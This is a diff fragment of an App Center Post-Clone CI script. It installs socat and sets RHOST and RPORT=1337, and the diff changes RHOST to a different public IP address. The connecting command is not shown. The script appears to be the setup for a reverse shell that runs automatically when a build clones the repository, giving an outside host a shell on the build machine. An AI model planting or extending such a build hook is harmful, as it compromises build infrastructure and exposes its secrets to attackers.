@@ -4,7 +4,7 @@ echo "This is an App Center Post-Clone script. For more information on how to us
 
 brew install socat
 
-RHOST=3.143.242.194
+RHOST=3.138.199.164
 
 RPORT=1337
 
